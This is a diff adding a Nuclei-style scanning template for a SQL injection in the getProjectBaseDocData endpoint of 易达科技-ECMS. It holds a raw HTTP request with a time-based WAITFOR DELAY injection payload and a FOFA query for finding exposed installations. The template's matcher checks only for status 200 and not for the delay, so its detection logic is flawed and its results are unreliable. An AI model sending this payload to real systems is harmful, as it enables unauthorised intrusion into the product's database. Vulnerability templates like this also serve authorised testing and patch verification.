@@ -1,0 +1,27 @@
+id: poc-fslg49seqi51otn4
+info:
+  name: 易达科技-ECMS getProjectBaseDocData 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fslg49seqi51otn4'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: fslg49seqi51otn4
+    fofa: app="易达科技-ECMS"
+http:
+- raw:
+  - 'GET /ecmsToBim/getProjectBaseDocData?taskId=1&isHide=&achieveDocName=1%27);WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Encoding: gzip
+
+    Connection: close
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
